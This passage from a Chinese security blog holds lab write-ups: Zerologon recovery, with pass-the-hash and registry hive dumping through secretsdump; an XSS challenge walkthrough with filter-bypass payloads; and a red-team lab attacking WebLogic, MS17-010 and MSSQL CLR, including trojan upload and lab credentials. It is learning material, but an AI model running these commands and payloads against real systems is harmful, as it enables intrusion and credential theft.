src="https://res.cloudinary.com/lin1109/image/upload/v1639010358/Xnip2021-12-09_08-39-06_zdzbye.png"></p><p>得到域管 hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:1c29a582a2aba5644f047dd8ad1d2810:::</span><br></pre></td></tr></table></figure><p>pth 横向</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./wmiexec.py -hashes :1c29a582a2aba5644f047dd8ad1d2810 administrator@172.16.122.91</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639011283/Xnip2021-12-09_08-54-31_qxy74g.png"></p><p>导出 sam system 等文件到本地，获取域控机器上本地保存之前的 hash 值用于恢复，不然就脱域了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SAM sam.save</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639011589/Xnip2021-12-09_08-58-07_k9cmjj.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lget system.save</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lget sam.save</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lget security.save </span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639011589/Xnip2021-12-09_08-58-16_dxssdy.png"></p><p>在攻击机当前目录会多出三个文件</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639011589/Xnip2021-12-09_08-59-10_nhmtb0.png"></p><p>清理痕迹，删除域控上导出的文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">del</span> /f system.save</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">del</span> /f sam.save</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">del</span> /f security.save</span><br></pre></td></tr></table></figure><p>使用 sam.save、security.save、system.save 这些文件来还原域控机器上的 Ntlm Hash 值，用于恢复密码，不然就脱域了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure><p>拿到 $MACHINE.ACC 的 hash 值进行恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:083d08d11d453365d41177413c4d8ca8</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639012153/Xnip2021-12-09_09-07-48_vhncqi.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reinstall_original_pw.py  DC 172.16.122.91 083d08d11d453365d41177413c4d8ca8</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639012261/Xnip2021-12-09_09-10-27_db4qj6.png"></p><p>Success! DC machine account should be restored to it’s original value. You might want to secretsdump again to check.</p><p>使用脚本检测一下是否恢复成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py DC/DC\<span class="variable">$@172</span>.16.122.91 -just-dc -no-pass</span><br></pre></td></tr></table></figure><p>现在使用空密码去获取域内所有用户 hash 已经不行了</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1639012427/Xnip2021-12-09_09-12-59_xdm8ev.png"></p><p>使用 zerologon 攻击完之后一定要记得恢复域控机器账户密码，不然会导致脱域。等着呜噜呜噜呜噜</p><p><img src="https://img1.baidu.com/it/u=3207059566,351762776&fm=26&fmt=auto"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS 靶场通关记录</title>
      <link href="/posts/802139973/"/>
      <url>/posts/802139973/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p>相关靶场网上一大堆，部署也非常简单，这里就不细说了</p><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p>可以看到 url 中有一个 name 参数</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637231048/Xnip2021-11-18_18-23-47_jgeigs.png"></p><p>将 name&#x3D;test 改为 name&#x3D;admin，发现网页中内容也变了，并且是直接输入输出的，没有任何过滤，由此可知，name 是用户可控的参数</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637231144/Xnip2021-11-18_18-25-34_z7gpex.png"></p><p>因此直接打 payload 即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637231357/Xnip2021-11-18_18-28-53_o0jfjk.png"></p><h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p>可以看到我们的 payload 直接被插入到了 h2 标签，这里输入框的内容是可控的，是个 input 标签</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637231674/Xnip2021-11-18_18-34-04_bum9ye.png"></p><p>直接闭合 input 标签即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637231860/Xnip2021-11-18_18-37-27_mkfcwy.png"></p><h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p>这题和 level2 一样，会将输入的内容直接输出到 h2 标签里</p><p>尝试闭合 input 标签但是发现这一关对双引号进行了实体化编码输出</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637232371/Xnip2021-11-18_18-45-54_isf5lj.png"></p><p>单独输入一个单引号发现 value 属性被闭合了</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637232536/Xnip2021-11-18_18-48-39_ykzbvn.png"></p><p>那么可以构造 payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>然后点击一下输入框即可触发 xss</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637232642/Xnip2021-11-18_18-50-07_i3ba41.png"></p><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p>这题还是将输入的内容直接输出到 h2 标签</p><p>单独输入一个双引号，发现 value 属性被闭合</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637232810/Xnip2021-11-18_18-53-19_uwbqfd.png"></p><p>直接构造 payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>点击一下输入框即可触发 xss</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637232959/Xnip2021-11-18_18-55-46_hconyb.png"></p><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>过滤了 onclick</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637233587/Xnip2021-11-18_19-06-14_mhfywh.png"></p><p>尝试引入图片报错方式，发现也被过滤、onfocus 也被过滤了</p><p>尝试构造一个 a 标签绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a href=javascript:alert(/xss/)&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637234416/Xnip2021-11-18_19-20-03_fkfp5z.png"></p><h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p>直接用第五关的 payload 发现 href 被过滤了</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638775940/Xnip2021-12-06_15-31-03_y5qlh0.png"></p><p>可以大小写混合绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; ONclick=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638775940/Xnip2021-12-06_15-31-50_m8gjz1.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638775939/Xnip2021-12-06_15-32-01_s91oej.png"></p><h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p>上一关 payload 直接打过去，发现过滤了 onclick 中的 on</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638777093/Xnip2021-12-06_15-51-06_grvxpi.png"></p><p>那么直接构造 payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;oonnclick=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638777093/Xnip2021-12-06_15-51-19_n9yo4d.png"></p><p>点击即可弹窗</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638777141/Xnip2021-12-06_15-52-08_vhv5sz.png"></p><h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p>一个 a 标签，有 href 属性</p><p>构造 payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure><p>javascript 被过滤，会被添加一个下划线</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638778195/Xnip2021-12-06_16-01-36_r5lkvj.png"></p><p>js unicode 编码即可绕过</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638779166/Xnip2021-12-06_16-25-55_ixypjp.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638778265/Xnip2021-12-06_16-10-41_kw6nzr.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638778265/Xnip2021-12-06_16-10-52_jfbylx.png"></p><h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p>也是 a 标签 href 属性</p><p>直接输入 javascript:alert (&#x2F;xss&#x2F;) 提示我参数不合法</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638782679/Xnip2021-12-06_17-18-55_uvkxz6.png"></p><p>构造 payload 加一个 http:&#x2F;&#x2F; 不提示链接不合法了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);<span class="attr">http</span>:<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>但是过滤了 javascript</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638782678/Xnip2021-12-06_17-20-27_jjg42p.png"></p><p>参考第八关，可以 unicode 编码绕过，同时需要注释掉后面的 http:&#x2F;&#x2F;</p><p>payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#<span class="number">106</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">118</span>;&amp;#<span class="number">97</span>;&amp;#<span class="number">115</span>;&amp;#<span class="number">99</span>;&amp;#<span class="number">114</span>;&amp;#<span class="number">105</span>;&amp;#<span class="number">112</span>;&amp;#<span class="number">116</span>;:<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)<span class="comment">//http://</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638782775/Xnip2021-12-06_17-26-00_z0oxeu.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638782952/Xnip2021-12-06_17-28-56_mw25dn.png"></p><h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p>输入’’ ‘ &gt;&lt;script onclick 发现过滤了” &lt;&gt;</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638837334/Xnip2021-12-07_08-35-00_pfev2k.png"></p><p>并且有三个隐藏的文本框，根据他们的 name 构造传值，发现最后一个文本框可以利用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_link=<span class="string">&quot; type=&#x27;text&#x27;&gt;&amp;t_history=&quot;</span> type=<span class="string">&#x27;text&#x27;</span>&gt;&amp;t_sort=<span class="string">&quot; type=&#x27;text&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638837566/Xnip2021-12-07_08-37-49_nfagn0.png"></p><p>那么可以构造 payload</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638837689/Xnip2021-12-07_08-40-57_rhk8bk.png"></p><p>点击文本框即可触发 xss</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638837687/Xnip2021-12-07_08-41-07_smnune.png"></p><h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><p>使用第 10 关的测试语句测试，发现过滤了 “&lt;&gt;</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_link=<span class="string">&quot; type=&#x27;text&#x27;&gt;&amp;t_history=&quot;</span> type=<span class="string">&#x27;text&#x27;</span>&gt;&amp;t_sort=<span class="string">&quot; type=&#x27;text&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838526/Xnip2021-12-07_08-54-04_wnevpb.png"></p><p>查看源代码可以发现，变量 $str11 通过 http 头的 Referer 字段获取变量值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br></pre></td></tr></table></figure><p>该变量在过滤掉 &lt;&gt; 后放进了和 Level-10 类似的属性为 hidden 的 input 框中，抓包伪造 Referer 的值，原理与 Level-10 类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer:&quot;type=&quot;text&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838525/Xnip2021-12-07_08-54-37_nzg3ny.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838525/Xnip2021-12-07_08-54-49_o47gjv.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838526/Xnip2021-12-07_08-55-01_uyuwmd.png"></p><h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><p>查看源代码，发现名为 t_ua 的隐藏文本框，直接抓包修改 ua 值即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838792/Xnip2021-12-07_08-57-07_v0bqun.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838793/Xnip2021-12-07_08-59-19_kduxlg.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638838792/Xnip2021-12-07_08-59-33_aso8nh.png"></p><h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><p>多了一个 t_cook 的隐藏文本框，根据前几关的经验，想必是 cookie？</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638839138/Xnip2021-12-07_09-05-25_szaktj.png"></p><p>bp 抓包修改 cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: &quot;type=&quot;text&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638839121/Xnip2021-12-07_09-04-40_hygifm.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1638839121/Xnip2021-12-07_09-04-51_yigguv.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透攻击红队靶场 WriteUp</title>
      <link href="/posts/1101979205/"/>
      <url>/posts/1101979205/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><p>想加师傅的星球，刚好看到这篇文章，打完靶场就可以进师傅星球，就有了此文</p><p>我是菜鸡，大佬勿喷！！！</p><h2 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h2><p>靶场来自于渗透攻击红队公众号</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636591306/Xnip2021-11-11_08-37-06_iwqupg.png"></p><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>这里因为本地环境的原因，我将网段重新划分了一下</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636591307/Xnip2021-11-11_08-40-41_yi4re0.png"></p><p>需要在 windows server 2012 R2 （weblogic 单机）这台机器上开启 weblogic 服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\startWebLogic.cmd <span class="comment">#执行这个脚本</span></span><br></pre></td></tr></table></figure><h2 id="靶场相关账户密码"><a href="#靶场相关账户密码" class="headerlink" title="靶场相关账户密码"></a>靶场相关账户密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">解压密码：saulGoodman.cn@redteam.red</span><br><span class="line"></span><br><span class="line">域控：Windows Server 2008 + IIS + Exchange 2013 邮件服务</span><br><span class="line"></span><br><span class="line">目录还原密码：redteam!@#45</span><br><span class="line"></span><br><span class="line">主机名：owa</span><br><span class="line"></span><br><span class="line">域管理员：administrator:Admin12345</span><br><span class="line"></span><br><span class="line">域内服务器 Mssql：Windows Server 2008 + SQL Server 2008 （被配置了非约束委派）</span><br><span class="line"></span><br><span class="line">主机名：sqlserver-2008</span><br><span class="line"></span><br><span class="line">本地管理员：Administrator:Admin12345</span><br><span class="line"></span><br><span class="line">域账户：redteam\sqlserver:Server12345 （被配置了约束委派）</span><br><span class="line"></span><br><span class="line">Mssql：sa:sa</span><br><span class="line"></span><br><span class="line">域内个人 PC：Windows 7</span><br><span class="line"></span><br><span class="line">主机名：work-7</span><br><span class="line"></span><br><span class="line">本地管理员:john：admin!@#45</span><br><span class="line"></span><br><span class="line">域账户：redteam\saul:admin!@#45</span><br><span class="line"></span><br><span class="line">单机服务器：Windows server r2 + weblogic</span><br><span class="line"></span><br><span class="line">主机名：weblogic</span><br><span class="line"></span><br><span class="line">本地管理员：Administrator:Admin12345</span><br><span class="line"></span><br><span class="line">其他域用户：</span><br><span class="line"></span><br><span class="line">域服务账户：redteam\sqlserver:Server12345 （被配置了约束委派）</span><br><span class="line"></span><br><span class="line">邮件用户：redteam\mail:admin!@#45</span><br><span class="line"></span><br><span class="line">加域账户：redteam\adduser:Add12345</span><br><span class="line"></span><br><span class="line">redteam\saulgoodman:Saul12345 （被配置了非约束委派）</span><br><span class="line"></span><br><span class="line">redteam\gu:Gu12345</span><br><span class="line"></span><br><span class="line">redteam\apt404:Apt12345</span><br></pre></td></tr></table></figure><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>目标 IP：10.2.14.27</p><p>常规流程，nmap 扫描一下端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -P0 -A -v 10.2.14.27</span><br></pre></td></tr></table></figure><p>发现有 weblogic</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636591831/Xnip2021-11-11_08-50-17_yh8oud.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636597114/Xnip2021-11-11_10-18-13_ywni5d.png"></p><h2 id="weblogic-CVE-2020-2555-getshell"><a href="#weblogic-CVE-2020-2555-getshell" class="headerlink" title="weblogic CVE-2020-2555 getshell"></a>weblogic CVE-2020-2555 getshell</h2><p>话不多少，直接上 weblogic 漏洞检测工具扫一波</p><p>存在 CVE-2020-2555</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636591898/Xnip2021-11-11_08-50-59_pm3m5d.png"></p><p>查询一下有无杀软</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636591962/Xnip2021-11-11_08-52-33_v8hu9w.png"></p><p>无杀软直接上线</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636592076/Xnip2021-11-11_08-54-00_gdebpn.png"></p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636592076/Xnip2021-11-11_08-54-18_pn2zrl.png"></p><h2 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h2><p>发现 weblogic 这台机器是双网卡，有一个内网网段</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636592556/Xnip2021-11-11_08-58-10_yyrznx.png"></p><p>跑一下账户密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636598937/Xnip2021-11-11_10-48-20_ues1gs.png"></p><p>用 fscan 扫一下，发现该网段下还存在一台 win7，并且存在 ms17-010</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636594444/Xnip2021-11-11_09-33-43_gk5y9y.png"></p><p>cs 上的 exp 没利用成功，上线 msf 操作一下吧</p><p>cs 会话派生给 msf</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636593963/Xnip2021-11-11_09-25-33_vlhygh.png"></p><p>添加路由</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636594527/Xnip2021-11-11_09-29-25_lm9awt.png"></p><h2 id="ms-17-010-getshell"><a href="#ms-17-010-getshell" class="headerlink" title="ms-17-010 getshell"></a>ms-17-010 getshell</h2><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636596806/Xnip2021-11-11_09-58-55_g5rnpy.png"></p><p>cs 转发上线</p><p>生成木马上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /Users/lin/Desktop/bea.exe  C:/Windows/Temp/bea.exe</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636598600/Xnip2021-11-11_10-42-50_ysfejs.png"></p><p>执行木马</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636598522/Xnip2021-11-11_10-41-32_vb6kgi.png"></p><p>这里有个坑，刚开始怎么都不上线，后来发现是 weblogic 这台防火墙是开着的，可以使用命令关闭防火墙后转发上线</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636689590/Xnip2021-11-12_11-59-39_tpdehv.png"></p><p>至此 weblogic 和 win7 这两台主机均上线</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636598627/Xnip2021-11-11_10-43-37_abmlfk.png"></p><p>跑一下账户密码</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636598941/Xnip2021-11-11_10-48-43_i917yv.png"></p><p>进一步信息收集发现 win7 上也是双网卡主机，还有另外一个网段</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636598801/Xnip2021-11-11_10-45-56_pjvy9i.png"></p><p>并且存在域环境</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636603501/Xnip2021-11-11_12-04-24_yuqx8s.png"></p><p>不说了，还是 fscan 走一波</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Windows\Temp\fscan64.exe <span class="literal">-h</span> <span class="number">172.16</span>.<span class="number">20.0</span>/<span class="number">24</span> <span class="literal">-o</span> <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p>发现 dc 和一台 sqlserver，并且 fscan 爆破出了 mssql 的账户密码，非常的贴心</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] 172.16.20.132  [+]DC REDTEAM\OWA</span><br><span class="line">[*] 172.16.20.133        REDTEAM\SQLSERVER-2008 sa sa</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636599333/Xnip2021-11-11_10-52-25_fahegz.png"></p><p>这里连上 mssql 之后使用 xp_cmdshell 写文件发现权限很低，然后又不出网，不能远程下载文件，只好换一种思路</p><h2 id="clr-提权上线"><a href="#clr-提权上线" class="headerlink" title="clr 提权上线"></a>clr 提权上线</h2><p>添加路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 172.16.20.0/24</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636610634/Xnip2021-11-11_12-24-57_yt487c.png"></p><p>使用 msf clr 攻击模块获得一个会话</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636617912/Xnip2021-11-11_16-04-50_lqvunt.png"></p><p>cs 转发上线，生成木马上传</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636618978/Xnip2021-11-11_16-22-45_wljmkk.png"></p><p>普通权限上线</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1636619244/Xnip2021-11-11_16-27-11_wpkdsg.png"></p><p>使用 clr 提权上线</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SharpSQLTools.exe 172.16.20.133 sa sa master install_clr</span><br><span class="line">SharpSQLTools.exe 172.16.20.133 sa sa master enable_clr</span><br><span class="line">SharpSQLTools.exe 172.16.20.133 sa sa master clr_efspotato c:/Users/Public/b1.exe</span><br></pre></td></tr></table></figure><p><img 